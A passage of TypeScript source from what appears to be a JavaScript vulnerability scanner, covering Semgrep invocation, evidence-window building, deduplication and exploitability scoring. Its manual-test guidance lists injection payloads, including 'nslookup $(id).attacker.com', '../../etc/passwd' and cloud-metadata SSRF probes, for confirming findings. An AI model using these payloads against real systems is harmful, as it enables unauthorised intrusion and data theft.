            taintTrace: taintTraces.length > 0 ? taintTraces : undefined,
            trace: taintTraces.map(t => `${t.type.toUpperCase()}: line ${t.line}`),
          }));
        }
      }
    } catch (error) {
      const err = error as any;
      const errorMsg = String(err?.message || error || 'Unknown error');
      const stderr = String(err?.stderr || '').trim();
      
      // Log the first line of the error message
      console.warn('[Scanner] Semgrep error:', errorMsg.split('\n')[0]);
      
      // If there's stderr output, log a few lines to help diagnose the issue
      if (stderr && !stderr.includes(errorMsg.split('\n')[0])) {
        const stderrLines = stderr.split('\n').filter(line => line.trim()).slice(0, 5);
        if (stderrLines.length > 0) {
          console.warn('[Scanner] Semgrep stderr:', stderrLines.join(' | '));
        }
      }
    }

    return results;
  }

  private async resolveSemgrepCommand(): Promise<string | null> {
    if (this.semgrepResolvedCmd !== undefined) return this.semgrepResolvedCmd;

    const candidates = ['semgrep', 'python -m semgrep', 'python3 -m semgrep'];

    for (const cmd of candidates) {
      try {
        const execOptions: any = {
          maxBuffer: 1024 * 1024,
          timeout: 5000,
        };
        if (process.platform === 'win32') {
          execOptions.shell = process.env.COMSPEC || 'cmd.exe';
        }
        await execAsync(`${cmd} --version`, execOptions);
        this.semgrepResolvedCmd = cmd;
        return cmd;
      } catch {
        // try next candidate
      }
    }

    this.semgrepResolvedCmd = null;
    if (!this.semgrepWarnedMissing) {
      this.semgrepWarnedMissing = true;
      console.warn('[Scanner] Semgrep not found. Install with: `pip install semgrep`');
    }
    return null;
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // EVIDENCE WINDOW BUILDERS - 2500+ char coherent context with highlighting
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  /**
   * Build evidence window with 2500+ chars of coherent code context
   * and proper highlighting of the vulnerable code.
   * Ensures context is meaningful and not out-of-context snippets.
   */
  private buildEvidenceWindow(
    ctx: DetectionContext,
    line: number,
    col: number,
    matchLen: number
  ): EvidenceWindow {
    const { code, lines, lineOffsets } = ctx;
    const totalLines = lines.length;
    
    if (line <= 0 || line > totalLines) {
      return { text: '', highlights: [], startLine: 1, endLine: 1 };
    }

    // Find logical code block boundaries (function/class/block scope)
    const blockStart = this.findBlockStart(lines, line - 1);
    const blockEnd = this.findBlockEnd(lines, line - 1);

    // Calculate target window to get 2500+ chars
    const targetChars = Scanner.MIN_CONTEXT_CHARS;
    const lineAvgChars = Math.max(40, Math.floor(code.length / Math.max(1, totalLines)));
    const linesNeeded = Math.ceil(targetChars / lineAvgChars);
    const halfLines = Math.floor(linesNeeded / 2);

    // Start with block boundaries if they provide better context
    let startLine = Math.max(1, Math.min(blockStart + 1, line - halfLines));
    let endLine = Math.min(totalLines, Math.max(blockEnd + 1, line + halfLines));

    // Ensure we have enough lines for 2500+ chars
    let windowText = lines.slice(startLine - 1, endLine).join('\n');
    
    // Expand window if needed to reach target chars
    let expansionAttempts = 0;
    const maxExpansions = 100;
    while (windowText.length < targetChars && (startLine > 1 || endLine < totalLines) && expansionAttempts < maxExpansions) {
      expansionAttempts++;
      if (startLine > 1) {
        startLine--;
        windowText = lines.slice(startLine - 1, endLine).join('\n');
      }
      if (windowText.length >= targetChars) break;
      if (endLine < totalLines) {
        endLine++;
        windowText = lines.slice(startLine - 1, endLine).join('\n');
      }
    }

    // Cap at max chars while keeping the vulnerable line centered
    if (windowText.length > Scanner.MAX_CONTEXT_CHARS) {
      const vulnLineInWindow = line - startLine;
      const linesInWindow = endLine - startLine + 1;
      const charsPerLine = windowText.length / linesInWindow;
      const maxLines = Math.floor(Scanner.MAX_CONTEXT_CHARS / charsPerLine);
      const halfMaxLines = Math.floor(maxLines / 2);
      
      const newStart = Math.max(1, line - halfMaxLines);
      const newEnd = Math.min(totalLines, line + halfMaxLines);
      
      startLine = newStart;
      endLine = newEnd;
      windowText = lines.slice(startLine - 1, endLine).join('\n');
      
      // Final trim if still too long
      if (windowText.length > Scanner.MAX_CONTEXT_CHARS) {
        windowText = windowText.slice(0, Scanner.MAX_CONTEXT_CHARS);
        const newLineCount = windowText.split('\n').length;
        endLine = startLine + newLineCount - 1;
      }
    }

    // Build highlights for the vulnerable code
    const highlights: CodeHighlight[] = [];
    const relLine = line - startLine + 1;
    
    if (relLine >= 1 && relLine <= endLine - startLine + 1) {
      const lineText = lines[line - 1] || '';
      const startCol = Math.max(1, Math.min(col + 1, lineText.length + 1));
      const endColVal = Math.min(lineText.length + 1, startCol + Math.max(1, matchLen));

      highlights.push({
        kind: 'vulnerable',
        startLine: relLine,
        startCol,
        endLine: relLine,
        endCol: endColVal,
      });
    }

    // Beautify minified code for readability
    const beautified = this.beautifyIfMinified(windowText);
    
    return {
      text: beautified,
      highlights,
      startLine,
      endLine,
    };
  }

  /**
   * Detect and beautify minified JavaScript code for better readability.
   * Only beautifies if code appears minified (long lines, no spacing).
   */
  private beautifyIfMinified(code: string): string {
    if (!code || code.length < 100) return code;
    
    const lines = code.split('\n');
    const avgLineLen = code.length / Math.max(1, lines.length);
    
    // Detect minified code: avg line > 150 chars, low newline density
    if (avgLineLen < 150) return code;
    
    // Simple beautification: add newlines and indentation
    let beautified = code
      // Add newlines after semicolons (not in strings)
      .replace(/;(?=(?:[^"']*["'][^"']*["'])*[^"']*$)/g, ';\n')
      // Add newlines after opening braces
      .replace(/\{(?=(?:[^"']*["'][^"']*["'])*[^"']*$)/g, '{\n')
      // Add newlines before closing braces
      .replace(/\}(?=(?:[^"']*["'][^"']*["'])*[^"']*$)/g, '\n}')
      // Add space after commas
      .replace(/,(?=(?:[^"']*["'][^"']*["'])*[^"']*$)/g, ', ');
    
    // Basic indentation
    const indented: string[] = [];
    let indent = 0;
    for (const line of beautified.split('\n')) {
      const trimmed = line.trim();
      if (!trimmed) continue;
      
      // Decrease indent for closing braces
      if (trimmed.startsWith('}')) indent = Math.max(0, indent - 1);
      
      indented.push('  '.repeat(indent) + trimmed);
      
      // Increase indent for opening braces
      if (trimmed.endsWith('{')) indent++;
    }
    
    beautified = indented.join('\n');
    
    // Limit to reasonable size (don't expand too much)
    if (beautified.length > code.length * 3) {
      return code; // Beautification made it too large, return original
    }
    
    return beautified.slice(0, 8000); // Cap at 8k chars
  }

  /**
   * Find the start of the logical code block containing this line
   */
  private findBlockStart(lines: string[], lineIdx: number): number {
    if (!lines.length || lineIdx < 0 || lineIdx >= lines.length) return Math.max(0, lineIdx);
    let braceDepth = 0;
    let parenDepth = 0;

    for (let i = lineIdx; i >= 0; i--) {
      const line = lines[i] ?? '';
      
      // Count braces going backwards
      for (let j = line.length - 1; j >= 0; j--) {
        const c = line[j];
        if (c === '}') braceDepth++;
        else if (c === '{') {
          if (braceDepth > 0) braceDepth--;
          else {
            // Found opening brace at this nesting level
            // Look for function/class/if/etc declaration
            const preceding = lines.slice(Math.max(0, i - 2), i + 1).join(' ');
            if (/(?:function|class|if|else|for|while|switch|try|catch|=>|\bdo)\s*(?:\([^)]*\))?\s*\{?\s*$/.test(preceding)) {
              return Math.max(0, i - 1);
            }
          }
        }
        if (c === ')') parenDepth++;
        else if (c === '(') {
          if (parenDepth > 0) parenDepth--;
        }
      }
      
      // Stop at function/class declarations
      if (/^\s*(?:export\s+)?(?:async\s+)?(?:function|class)\s+\w+/.test(line)) {
        return i;
      }
      
      // Stop at arrow function assignments
      if (/^\s*(?:const|let|var)\s+\w+\s*=\s*(?:async\s+)?(?:\([^)]*\)|[a-zA-Z_$][\w$]*)\s*=>/.test(line)) {
        return i;
      }
      
      // Don't go past 50 lines back
      if (lineIdx - i > 50) break;
    }
    
    return Math.max(0, lineIdx - 25);
  }

  /**
   * Find the end of the logical code block containing this line
   */
  private findBlockEnd(lines: string[], lineIdx: number): number {
    let braceDepth = 0;
    
    for (let i = lineIdx; i < lines.length; i++) {
      const line = lines[i];
      
      for (const c of line) {
        if (c === '{') braceDepth++;
        else if (c === '}') {
          if (braceDepth > 0) braceDepth--;
          else {
            // Found closing brace at this nesting level
            return i;
          }
        }
      }
      
      // Don't go past 50 lines forward
      if (i - lineIdx > 50) break;
    }
    
    return Math.min(lines.length - 1, lineIdx + 25);
  }

  /**
   * Build evidence window for tainted data flow, highlighting both source and sink.
   * Ensures the full taint flow is visible with clear source→sink path.
   */
  private buildTaintFlowEvidence(
    ctx: DetectionContext,
    sourceLine: number,
    sinkLine: number,
    sinkCol: number,
    sinkMatchLen: number,
    sourceVars: TaintedVariable[]
  ): EvidenceWindow {
    const { code, lines, lineOffsets } = ctx;
    const totalLines = lines.length;

    // Collect all relevant lines from the taint flow (source, propagation, sink)
    const relevantLines = new Set<number>();
    relevantLines.add(sourceLine);
    relevantLines.add(sinkLine);
    
    for (const srcVar of sourceVars) {
      relevantLines.add(srcVar.sourceLine);
      for (const prop of srcVar.propagationChain) {
        relevantLines.add(prop.line);
      }
    }
    
    // Find the span of the taint flow
    const allLines = Array.from(relevantLines).sort((a, b) => a - b);
    const minLine = allLines[0] || sourceLine;
    const maxLine = allLines[allLines.length - 1] || sinkLine;
    
    // Calculate window with padding for context
    const paddingBefore = 8;
    const paddingAfter = 8;
    let startLine = Math.max(1, minLine - paddingBefore);
    let endLine = Math.min(totalLines, maxLine + paddingAfter);

    // Try to start at a logical block boundary
    const blockStart = this.findBlockStart(lines, startLine - 1);
    if (blockStart < startLine - 1 && blockStart >= startLine - 15) {
      startLine = blockStart + 1;
    }

    // Build window text
    let windowText = lines.slice(startLine - 1, endLine).join('\n');

    // Ensure we have at least 2500 chars
    let expansionAttempts = 0;
    while (windowText.length < Scanner.MIN_CONTEXT_CHARS && (startLine > 1 || endLine < totalLines) && expansionAttempts < 100) {
      expansionAttempts++;
      if (startLine > 1) startLine--;
      if (endLine < totalLines) endLine++;
      windowText = lines.slice(startLine - 1, endLine).join('\n');
    }

    // Cap at max chars while preserving the taint flow
    if (windowText.length > Scanner.MAX_CONTEXT_CHARS) {
      // Calculate chars needed for taint flow
      const flowLines = lines.slice(minLine - 1, maxLine).join('\n');
      
      if (flowLines.length <= Scanner.MAX_CONTEXT_CHARS) {
        // Taint flow fits, trim context equally from both ends
        const remaining = Scanner.MAX_CONTEXT_CHARS - flowLines.length;
        const paddingChars = Math.floor(remaining / 2);
        
        // Find how many lines fit in padding
        let beforeText = '';
        let afterText = '';
        let newStart = minLine;
        let newEnd = maxLine;
        
        for (let i = minLine - 1; i >= startLine - 1 && beforeText.length < paddingChars; i--) {
          beforeText = lines[i] + '\n' + beforeText;
          newStart = i + 1;
        }
        
        for (let i = maxLine; i < endLine && afterText.length < paddingChars; i++) {
          afterText += '\n' + lines[i];
          newEnd = i + 1;
        }
        
        startLine = newStart;
        endLine = newEnd;
        windowText = lines.slice(startLine - 1, endLine).join('\n');
      } else {
        // Taint flow too long, center on sink
        const halfMax = Math.floor(Scanner.MAX_CONTEXT_CHARS / 2);
        const sinkOffset = lines.slice(startLine - 1, sinkLine).join('\n').length;
        
        const trimStart = Math.max(0, sinkOffset - halfMax);
        const trimEnd = Math.min(windowText.length, sinkOffset + halfMax);
        windowText = windowText.slice(trimStart, trimEnd);
        
        const newLineCount = windowText.split('\n').length;
        // Approximate new start/end lines (guard: sink line may be out of range after trim)
        const sinkLineText = sinkLine >= 1 && sinkLine <= lines.length ? lines[sinkLine - 1] : null;
        const sinkIdx = sinkLineText ? windowText.indexOf(sinkLineText) : -1;
        const linesBeforeSink = sinkIdx >= 0 ? windowText.slice(0, sinkIdx).split('\n').length - 1 : 0;
        startLine = Math.max(1, sinkLine - linesBeforeSink);
        endLine = Math.min(totalLines, startLine + newLineCount - 1);
      }
    }

    // Build highlights for source(s), propagation, and sink
    const highlights: CodeHighlight[] = [];

    // Add source highlights with full expression highlighting
    for (const srcVar of sourceVars) {
      if (srcVar.sourceLine >= startLine && srcVar.sourceLine <= endLine) {
        const relLine = srcVar.sourceLine - startLine + 1;
        const lineText = lines[srcVar.sourceLine - 1] || '';
        
        // Find the full source expression in the line
        const varIdx = lineText.indexOf(srcVar.name);
        const exprMatch = lineText.match(/=\s*(.+?)(?:;|$)/);
        
        let hlStartCol = Math.max(1, srcVar.sourceColumn);
        let hlEndCol = Math.min(lineText.length + 1, srcVar.sourceColumn + srcVar.name.length);
        
        // Expand to include the full expression if possible
        if (exprMatch && exprMatch.index !== undefined) {
          hlStartCol = exprMatch.index + 1;
          hlEndCol = Math.min(lineText.length + 1, exprMatch.index + exprMatch[0].length + 1);
        }
        
        highlights.push({
          kind: 'source',
          name: srcVar.name,
          startLine: relLine,
          startCol: hlStartCol,
          endLine: relLine,
          endCol: hlEndCol,
        });
      }
      
      // Add propagation highlights
      for (const prop of srcVar.propagationChain) {
        if (prop.line >= startLine && prop.line <= endLine) {
          const relLine = prop.line - startLine + 1;
          const lineText = lines[prop.line - 1] || '';
          
          highlights.push({
            kind: 'taint',
            name: 'propagation',
            startLine: relLine,
            startCol: 1,
            endLine: relLine,
            endCol: Math.min(lineText.length + 1, lineText.trimEnd().length + 1),
          });
        }
      }
    }

    // Add sink highlight with full expression
    if (sinkLine >= startLine && sinkLine <= endLine) {
      const relSinkLine = sinkLine - startLine + 1;
      const sinkLineText = lines[sinkLine - 1] || '';
      
      // Expand sink highlight to cover the full dangerous expression
      let hlStartCol = Math.max(1, sinkCol + 1);
      let hlEndCol = Math.min(sinkLineText.length + 1, hlStartCol + Math.max(1, sinkMatchLen));
      
      // Try to expand to full statement
      const stmtMatch = sinkLineText.match(/[^;]*(?:innerHTML|outerHTML|document\.write|insertAdjacentHTML|eval|exec|fetch|axios)[^;]*/i);
      if (stmtMatch && stmtMatch.index !== undefined) {
        hlStartCol = stmtMatch.index + 1;
        hlEndCol = Math.min(sinkLineText.length + 1, stmtMatch.index + stmtMatch[0].length + 1);
      }

      highlights.push({
        kind: 'sink',
        startLine: relSinkLine,
        startCol: hlStartCol,
        endLine: relSinkLine,
        endCol: hlEndCol,
      });
    }

    // Sort highlights: source first, then propagation, then sink
    highlights.sort((a, b) => {
      const kindOrder: Record<string, number> = { source: 0, taint: 1, sink: 2, vulnerable: 2 };
      const aOrder = kindOrder[a.kind] ?? 3;
      const bOrder = kindOrder[b.kind] ?? 3;
      if (aOrder !== bOrder) return aOrder - bOrder;
      return a.startLine - b.startLine;
    });

    return {
      text: windowText,
      highlights,
      startLine,
      endLine,
    };
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // DEDUPLICATION AND ENRICHMENT
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private dedupeAndEnrich(results: ScanResult[], ctx: DetectionContext): ScanResult[] {
    // Filter out scan-skipped if we have real findings
    const hasRealFindings = results.some(r => r.ruleId !== 'scan-skipped');
    let list = results.filter(r => {
      if (r.ruleId === 'scan-skipped' && hasRealFindings) return false;
      return true;
    });

    // Deduplicate by intent
    const seen = new Set<string>();
    const byIntent = new Map<string, ScanResult>();
    const deduped: ScanResult[] = [];

    const getVulnerabilityClass = (r: ScanResult): string => {
      const id = (r.ruleId || '').toLowerCase();
      const category = (r.category || '').toLowerCase();
      
      if (/dom-xss|innerhtml|dangerouslysetinnerhtml|document\.write/.test(id) || category === 'dom-xss') return 'dom-xss';
      if (/reflected-xss/.test(id)) return 'reflected-xss';
      if (/sql.*injection|sqli/.test(id) || category === 'sql-injection') return 'sql-injection';
      if (/nosql.*injection/.test(id) || category === 'nosql-injection') return 'nosql-injection';
      if (/graphql.*injection/.test(id) || category === 'graphql-injection') return 'graphql-injection';
      if (/command-injection|exec|spawn/.test(id) || category === 'command-injection') return 'command-injection';
      if (/ssrf|server.*request/.test(id) || category === 'ssrf') return 'ssrf';
      if (/path.*traversal/.test(id) || category === 'path-traversal') return 'path-traversal';
      if (/prototype.*pollution|__proto__/.test(id) || category === 'prototype-pollution') return 'prototype-pollution';
      if (/trust.*boundary/.test(id) || category === 'trust-boundary') return 'trust-boundary';
      if (/mass.*assignment/.test(id) || category === 'mass-assignment') return 'mass-assignment';
      if (/open.*redirect/.test(id) || category === 'open-redirect') return 'open-redirect';
      if (/dom-clobbering/.test(id) || category === 'dom-clobbering') return 'dom-clobbering';
      if (/replace-xss|replace.*xss|cve-2025-27108/.test(id) || category === 'replace-xss') return 'replace-xss';
      if (/hardcoded.*secret/.test(id) || category === 'hardcoded-secret') return 'hardcoded-secret';

      return 'unknown';
    };

    const getIntentKey = (r: ScanResult): string => {
      const vulnClass = getVulnerabilityClass(r);
      const sinkLine = String(r.line || 0);
      const entryPoint = r.entryPoint || '';
      return `${r.file}|${sinkLine}|${vulnClass}|${entryPoint}`;
    };

    for (const r of list) {
      const intentKey = getIntentKey(r);
      const existingByIntent = byIntent.get(intentKey);

      if (existingByIntent) {
        // Keep higher severity/confidence
        const existingSev = this.severityRank(existingByIntent.severity);
        const newSev = this.severityRank(r.severity);
        const existingConf = this.confidenceRank(existingByIntent.confidence);
        const newConf = this.confidenceRank(r.confidence);

        if (newSev > existingSev || (newSev === existingSev && newConf > existingConf)) {
          const idx = deduped.indexOf(existingByIntent);
          if (idx >= 0) deduped.splice(idx, 1);
          byIntent.set(intentKey, r);
          deduped.push(r);
        }
        continue;
      }

      const fingerprint = `${r.ruleId}|${r.file}|${r.line}|${r.entryPoint || ''}|${r.parameter || ''}`;
      if (seen.has(fingerprint)) continue;
      seen.add(fingerprint);

      // Normalize for sanitizers
      const normalized = this.normalizeSeverityForSanitizers(r);
      byIntent.set(intentKey, normalized);
      deduped.push(normalized);
    }

    // Compute exploitability scores
    for (const r of deduped) {
      const { score, reasons } = this.computeExploitability(r);
      r.exploitability = score;
      r.exploitabilityReasons = reasons;
      this.attachAnalysisGuidance(r);
    }

    // Sort by severity then line
    deduped.sort((a, b) => {
      const sev = this.severityRank(b.severity) - this.severityRank(a.severity);
      if (sev !== 0) return sev;
      return (a.line || 0) - (b.line || 0);
    });

    // Cap per (file, ruleId) to avoid flooding from one file/rule
    const MAX_PER_FILE_RULE = 15;
    const byFileRule = new Map<string, ScanResult[]>();
    for (const r of deduped) {
      const key = `${r.file}|${r.ruleId || ''}`;
      const arr = byFileRule.get(key) ?? [];
      if (arr.length < MAX_PER_FILE_RULE) arr.push(r);
      byFileRule.set(key, arr);
    }
    const capped: ScanResult[] = [];
    for (const arr of byFileRule.values()) capped.push(...arr);
    capped.sort((a, b) => {
      const sev = this.severityRank(b.severity) - this.severityRank(a.severity);
      if (sev !== 0) return sev;
      return (a.line || 0) - (b.line || 0);
    });

    return capped;
  }

  // ═══════════════════════════════════════════════════════════════════════════════════════════════
  // HELPER METHODS
  // ═══════════════════════════════════════════════════════════════════════════════════════════════

  private extractIdentifiers(text: string): string[] {
    const idRegex = /\b([a-zA-Z_$][a-zA-Z0-9_$]*)\b/g;
    const ids: string[] = [];
    let m: RegExpExecArray | null;
    
    while ((m = idRegex.exec(text)) !== null) {
      const word = m[1];
      if (!/^(undefined|null|true|false|typeof|void|this|new|const|let|var|function|return|if|else|for|while|break|continue)$/.test(word)) {
        ids.push(word);
      }
    }
    
    return [...new Set(ids)];
  }

  private extractIdentifiersFromSink(line: string, sinkName: string): string[] {
    const ids: string[] = [];
    let rhs = '';

    // Bracket notation first: ["innerHTML"] = rhs
    const bracketHtml = /\[\s*['"](?:inner|outer)HTML['"]\s*\]\s*=\s*(.+?)(?:;|$)/s.exec(line);
    if (bracketHtml) {
      rhs = bracketHtml[1];
    }
    // Dot notation: .innerHTML = rhs
    else if (/innerHTML|outerHTML/.test(sinkName)) {
      const m = /\.(?:inner|outer)HTML\s*=\s*(.+?)(?:;|$)/s.exec(line);
      if (m) rhs = m[1];
    }
    if (!rhs && /document\.write|write/.test(sinkName)) {
      const m = /(?:document|window)\s*(?:\.write(?:ln)?|\[\s*['"]write['"]\s*\])\s*\(\s*(.+?)\s*\)/s.exec(line);
      if (m) rhs = m[1];
    }
    if (!rhs && /insertAdjacentHTML/.test(sinkName)) {
      const m = /insertAdjacentHTML\s*\(\s*[^,]+,\s*(.+?)\s*\)/s.exec(line);
      if (m) rhs = m[1];
    }
    if (!rhs && /__html/.test(sinkName)) {
      const m = /__html\s*:\s*(\w+)/.exec(line);
      if (m) { ids.push(m[1]); return ids; }
    }
    if (!rhs && /eval/.test(sinkName)) {
      const m = /(?:eval|(?:window|globalThis)\s*\[\s*['"]eval['"]\s*\])\s*\(\s*(.+?)\s*\)/s.exec(line);
      if (m) rhs = m[1];
    }
    if (!rhs && /Function/.test(sinkName)) {
      const m = /new\s+Function\s*\(\s*(.+?)\s*\)/s.exec(line);
      if (m) rhs = m[1];
    }
    if (!rhs && /import/.test(sinkName)) {
      const m = /\bimport\s*\(\s*(.+?)\s*\)/s.exec(line);
      if (m) rhs = m[1];
    }
    // String.replace/replaceAll - second arg is replacement (CVE-2025-27108)
    if (!rhs && /replace/.test(sinkName)) {
      const m = /\.(?:replace|replaceAll)\s*\(\s*[^,]+,\s*(.+?)\s*\)/s.exec(line);
      if (m) rhs = m[1];
    }
    // CSSOM sinks - style.cssText, insertRule
    if (!rhs && /style|insertRule|addRule/.test(sinkName)) {
      const m1 = /\.style\.cssText\s*=\s*(.+?)(?:;|$)/s.exec(line);
      const m2 = /(?:insertRule|addRule)\s*\(\s*(.+?)\s*\)/s.exec(line);
      if (m1) rhs = m1[1];
      else if (m2) rhs = m2[1];
    }

    if (rhs) return this.extractIdentifiers(rhs);
    return ids;
  }

  private getContext(ctx: DetectionContext, lineIndex: number, contextLines: number): string {
    const { lines } = ctx;
    const start = Math.max(0, lineIndex - contextLines);
    const end = Math.min(lines.length, lineIndex + contextLines + 1);
    return lines.slice(start, end).join('\n');
  }

  private buildLineOffsets(code: string): number[] {
    const offsets = [0];
    for (let i = 0; i < code.length; i++) {
      if (code.charCodeAt(i) === 10) {
        offsets.push(i + 1);
      }
    }
    return offsets;
  }

  private sanitizeScannableJavaScript(code: string): string {
    if (!code) return '';
    
    // Remove truncation markers
    const markerIdx = code.search(/\n\s*\[Content truncated - original size:/);
    if (markerIdx !== -1) {
      code = code.slice(0, markerIdx);
    }
    
    code = code.replace(/\n\n\/\*\s*\[Content truncated[^*]*\*\/\s*$/i, '');
    code = code.replace(/\n\s*\[Response truncated[^\]]*\]\s*$/i, '');
    code = code.replace(/^\s*\[Binary data[^\]]*\]\s*$/im, '');
    
    return code;
  }

  private async prettifyWithTimeout(input: string, timeoutMs: number): Promise<string> {
    const prettier = getPrettier();
    if (!prettier) {
      throw new Error('Prettier not available');
    }

    const run = prettier.format(input, {
      parser: 'babel',
      printWidth: 120,
      tabWidth: 2,
      useTabs: false,
      semi: true,
      singleQuote: true,
      trailingComma: 'es5',
      bracketSpacing: true,
      arrowParens: 'avoid',
    });

    const timeout = new Promise<never>((_, reject) => {
      setTimeout(() => reject(new Error('Prettier timeout')), timeoutMs);
    });

    return await Promise.race([run, timeout]);
  }

  private formatMinifiedCode(code: string): string {
    return code
      .replace(/;/g, ';\n')
      .replace(/\}/g, '}\n')
      .replace(/\{/g, '\n{\n')
      .replace(/\n\n+/g, '\n')
      .trim();
  }

  private loadSemgrepRules(): string {
    const rulesFile = path.join(this.rulesDir, 'javascript-security.yml');
    if (fs.existsSync(rulesFile)) {
      return fs.readFileSync(rulesFile, 'utf8');
    }
    return '';
  }

  /**
   * Parse Semgrep JSON output robustly. Handles multiple JSON objects (e.g. progress + result),
   * trailing newlines, and stderr mixed in. Prefers the object that has a "results" array.
   */
  private extractSemgrepJson(output: string): { results?: unknown[] } {
    const s = String(output || '').trim();
    if (!s) return { results: [] };
    const firstBrace = s.indexOf('{');
    const lastBrace = s.lastIndexOf('}');
    if (firstBrace < 0 || lastBrace <= firstBrace) {
      try {
        const parsed = JSON.parse(s);
        return Array.isArray(parsed?.results) ? parsed : { results: [] };
      } catch {
        return { results: [] };
      }
    }
    const candidate = s.slice(firstBrace, lastBrace + 1);
    try {
      const parsed = JSON.parse(candidate);
      if (parsed && Array.isArray(parsed.results)) return parsed;
      return { results: [] };
    } catch {
      // Fallback: find a JSON object that contains "results" (e.g. last object when Semgrep prints progress then result)
      const resultsKey = '"results":';
      const idx = candidate.lastIndexOf(resultsKey);
      if (idx >= 0) {
        let depth = 0;
        let start = -1;
        for (let i = idx - 1; i >= 0; i--) {
          const ch = candidate[i];
          if (ch === '}') depth++;
          else if (ch === '{') {
            if (depth === 0) {
              start = i;
              break;
            }
            depth--;
          }
        }
        if (start >= 0) {
          try {
            const parsed = JSON.parse(candidate.slice(start, lastBrace - firstBrace + 1));
            if (parsed && Array.isArray(parsed.results)) return parsed;
          } catch {
            // ignore
          }
        }
      }
      return { results: [] };
    }
  }

  private mapSeverity(severity: string | undefined): 'error' | 'warning' | 'info' {
    if (!severity) return 'info';
    const s = severity.toLowerCase();
    if (s === 'error' || s === 'critical') return 'error';
    if (s === 'warning' || s === 'warn') return 'warning';
    return 'info';
  }

  private severityRank(s: string | undefined): number {
    switch (s) {
      case 'error': return 3;
      case 'warning': return 2;
      case 'info': return 1;
      default: return 0;
    }
  }

  private confidenceRank(c: string | undefined): number {
    if (!c) return 0;
    switch (c.toLowerCase()) {
      case 'very-high': return 4;
      case 'high': return 3;
      case 'medium': return 2;
      case 'low': return 1;
      default: return 0;
    }
  }

  private normalizeConfidence(input: string | undefined): 'low' | 'medium' | 'high' | 'very-high' | 'unknown' {
    if (!input) return 'unknown';
    const s = String(input).toLowerCase().trim();
    if (s === 'very-high' || s === 'very_high' || s === 'veryhigh') return 'very-high';
    if (s === 'high') return 'high';
    if (s === 'medium' || s === 'med') return 'medium';
    if (s === 'low') return 'low';
    return 'unknown';
  }

  private normalizeSeverityForSanitizers(r: ScanResult): ScanResult {
    const hasSanitizer =
      (r.contextCode && Scanner.SANITIZERS.test(r.contextCode)) ||
      (r.taintTrace && r.taintTrace.some(t => /sanitiz/i.test(t.description))) ||
      (r.message && /sanitiz/i.test(r.message));

    if (hasSanitizer) {
      if (r.severity === 'error') {
        r.severity = 'warning';
        r.confidence = r.confidence === 'very-high' ? 'high' : r.confidence === 'high' ? 'medium' : r.confidence;
        r.message = r.message + ' (Sanitizer present - verify effectiveness)';
      } else if (r.severity === 'warning') {
        r.severity = 'info';
        r.confidence = r.confidence === 'high' ? 'medium' : r.confidence === 'medium' ? 'low' : r.confidence;
      }
    }

    return r;
  }

  private computeExploitability(f: ScanResult): { score: number; reasons: string[] } {
    let score = 0;
    const reasons: string[] = [];

    const rid = f.ruleId.toLowerCase();
    const category = (f.category || '').toLowerCase();
    
    // Base score by vulnerability class
    const baseByClass: Record<string, number> = {
      'hardcoded-secret': 8,
      'command-injection': 9,
      'rce': 9,
      'ssrf': 7,
      'sql-injection': 8,
      'nosql-injection': 7,
      'path-traversal': 7,
      'dom-xss': 6,
      'prototype-pollution': 6,
      'graphql-injection': 6,
      'trust-boundary': 7,
      'mass-assignment': 6,
      'open-redirect': 4,
      'dom-clobbering': 3,
    };

    // Find matching class
    for (const [cls, baseScore] of Object.entries(baseByClass)) {
      if (rid.includes(cls) || category.includes(cls)) {
        score += baseScore;
        reasons.push(`${cls} vulnerability (+${baseScore})`);
        break;
      }
    }

    // Adjust for confidence
    if (f.confidence === 'very-high') {
      score += 2;
      reasons.push('very-high confidence (+2)');
    } else if (f.confidence === 'high') {
      score += 1;
      reasons.push('high confidence (+1)');
    } else if (f.confidence === 'low') {
      score -= 1;
      reasons.push('low confidence (-1)');
    }

    // Adjust for taint trace presence
    if (f.taintTrace && f.taintTrace.length > 0) {
      score += 1;
      reasons.push('confirmed taint flow (+1)');
    }

    // Chainable vulnerabilities
    if (f.chainable) {
      score += 1;
      reasons.push('chainable (+1)');
    }

    // Clamp score
    score = Math.max(0, Math.min(10, score));

    return { score, reasons };
  }

  /**
   * Attach contextual analysis guidance based on vulnerability type.
   * Provides actionable investigation steps rather than generic payloads.
   */
  private attachAnalysisGuidance(f: ScanResult): void {
    if (!f.exploit) f.exploit = {};
    
    const rid = f.ruleId.toLowerCase();
    const category = (f.category || '').toLowerCase();
    
    // SSRF Analysis
    if (rid.includes('ssrf') || category.includes('ssrf')) {
      f.exploit.description = 'SSRF: server requests attacker-controlled URL. Confirm outbound request then test internal/metadata.';
      f.exploit.tips = [
        'Confirm with webhook.site or requestbin; then 127.0.0.1, 169.254.169.254 if applicable.',
        'Check for URL allowlist/blocklist bypass (redirects, encoding).',
      ];
      f.manualTest = [
        'Send request to https://webhook.site/unique-id to confirm server fetches URL.',
        'If allowed: http://127.0.0.1:80 or cloud metadata endpoint.',
      ];
    }
    
    // SQL Injection Analysis
    else if (rid.includes('sql') || category.includes('sql')) {
      f.exploit.description = 'SQL injection: tainted data in query. Confirm with quote then time-based or error-based.';
      f.exploit.tips = [
        'Confirm with single quote; check for errors or time delay.',
        'Identify DB (MySQL/Postgres/MSSQL) for correct syntax.',
      ];
      f.manualTest = [
        "Inject ' and check for error or behavior change.",
        'Time-based: SLEEP(5) or WAITFOR DELAY if no output.',
      ];
    }
    
    // Command Injection Analysis
    else if (rid.includes('command') || rid.includes('exec') || category.includes('command')) {
      f.exploit.description = 'Command injection: user input reaches shell. Confirm with sleep or DNS.';
      f.exploit.tips = [
        'Try ; | & or $(...) for chaining; sleep/DNS for blind confirmation.',
      ];
      f.manualTest = [
        'Inject $(sleep 5) or ; sleep 5 and observe delay.',
        'DNS: nslookup $(id).attacker.com to confirm execution.',
      ];
    }
    
    // Path Traversal Analysis
    else if (rid.includes('path') || rid.includes('traversal') || category.includes('path')) {
      f.exploit.description = 'Path traversal: user input in file path. Try ../ or encoded variants.';
      f.exploit.tips = [
        'Try ../, %2e%2e%2f, or absolute path; null byte in older stacks.',
        'Normalization order: Check if the app normalizes before or after validation.',
        'OS differences: Windows uses \\ and has case-insensitive paths.',
      ];
      f.manualTest = [
        'Try ../../etc/passwd (or ..\\..\\win.ini on Windows); check response for file content.',
      ];
    }

    // Prototype Pollution Analysis
